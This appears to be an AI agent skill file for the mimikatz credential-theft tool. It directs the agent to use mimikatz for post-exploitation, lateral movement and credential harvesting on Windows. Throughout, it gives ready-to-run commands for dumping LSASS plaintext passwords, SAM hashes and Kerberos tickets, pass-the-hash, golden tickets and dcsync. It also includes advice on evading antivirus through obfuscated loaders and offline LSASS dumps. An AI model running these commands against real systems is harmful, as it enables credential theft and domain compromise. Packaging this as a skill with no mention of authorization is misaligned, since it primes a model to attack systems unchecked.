---
name: mimikatz
description: Extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from Windows memory (LSASS). Use for post-exploitation, lateral movement, credential harvesting, and privilege escalation on Windows systems. Includes capabilities for Golden/Silver tickets, pass-the-hash, and dumping the SAM database.
---

# mimikatz

## Overview
Mimikatz is a powerful post-exploitation tool used to extract sensitive information from Windows memory. It is the industry standard for credential harvesting, capable of retrieving plaintext passwords from LSASS, manipulating Kerberos tickets, and performing pass-the-hash attacks. Category: Password Attacks / Post-Exploitation.

## Installation (if not already installed)
Mimikatz is a Windows binary. On Kali Linux, it is stored in the Windows resources directory. If missing:

```bash
sudo apt install mimikatz
```

The binaries are located at: `/usr/share/windows-resources/mimikatz/`

## Common Workflows

### Extracting Plaintext Credentials (LSASS)
Once running on a Windows target with administrative/SYSTEM privileges:
```powershell
privilege::debug
sekurlsa::logonpasswords
```

### Dumping the SAM Database
Extract local account hashes from the Security Account Manager:
```powershell
token::elevate
lsadump::sam
```

### Pass-the-Hash (PtH)
Launch a new process using a user's NTLM hash without knowing the password:
```powershell
sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:ab89b1234567890abcdef1234567890a
```

### Exporting Kerberos Tickets
Dump all Kerberos tickets (.kirbi) from memory to disk:
```powershell
sekurlsa::tickets /export
```

## Complete Command Reference

Mimikatz uses a module::command syntax. Below are the most critical modules and their functions.

### Core Modules

| Module | Description |
|------|-------------|
| `standard::` | Basic commands (exit, cls, answer, coffee, sleep, log) |
| `privilege::` | Privilege manipulation (e.g., `privilege::debug` to get SeDebugPrivilege) |
| `crypto::` | Crypto related functions (certificates, keys, providers) |
| `sekurlsa::` | **Primary module** for extracting credentials from LSASS memory |
| `kerberos::` | Kerberos ticket manipulation (Golden/Silver tickets, PTT) |
| `lsadump::` | Dumping LSA secrets, SAM, and Active Directory (NTDS.dit) |
| `token::` | Token manipulation (list, elevate, revert) |
| `process::` | Process management (list, stop, suspend, resume) |
| `service::` | Service management (list, start, stop, remove) |
| `vault::` | Windows Vault credential extraction |
| `dpapi::` | Data Protection API (DPAPI) functions |
| `event::` | Event log management (clear, drop) |
| `misc::` | Miscellaneous commands (cmd, regedit, taskmgr) |

### sekurlsa:: Commands (LSASS Analysis)
*   `logonpasswords`: Lists all available provider credentials (MSV, WDigest, Kerberos, TsPkg, LiveID, SSP).
*   `pth`: Pass-the-Hash. Requires `/user`, `/domain`, and `/ntlm`.
*   `tickets`: Lists or exports Kerberos tickets.
*   `msv`: Lists MSV credentials (LM/NTLM hashes).
*   `wdigest`: Lists WDigest credentials (plaintext).
*   `kerberos`: Lists Kerberos credentials (plaintext/passwords).
*   `tspkg`: Lists TsPkg credentials.
*   `livessp`: Lists LiveSSP credentials.
*   `ssp`: Lists SSP credentials.
*   `minidump <file>` : Switch context to a memory dump file (e.g., lsass.dmp).

### lsadump:: Commands (Database Dumping)
*   `sam`: Dumps the local SAM database.
*   `secrets`: Dumps LSA secrets.
*   `cache`: Dumps Domain Cached Credentials (MSCACHE v1/v2).
*   `dcsync`: Mimics a Domain Controller to pull credentials (requires `/user` and `/domain`).
*   `lsa`: Dumps LSA data (use `/patch` for older systems).

### kerberos:: Commands
*   `golden`: Create Golden/Silver tickets. Requires `/domain`, `/sid`, `/rc4` (KRBTGT hash), and `/user`.
*   `ptt <file>` : Pass-the-Ticket. Loads a `.kirbi` file into the current session.
*   `list`: Lists tickets in the current session.
*   `purge`: Purges all tickets from the session.

## Notes
- **Privileges**: Most commands require `privilege::debug` and administrative or SYSTEM rights.
- **Architecture**: Use the `x64` version for 64-bit Windows and `Win32` for 32-bit.
- **AV/EDR**: Mimikatz is highly flagged by security software. It often needs to be run via obfuscated loaders, in-memory (PowerShell), or by dumping LSASS memory first and analyzing the dump offline.
- **Offline Analysis**: You can dump LSASS memory on a target (e.g., via Task Manager or Procdump) and run `sekurlsa::minidump lsass.dmp` on your own machine to extract credentials.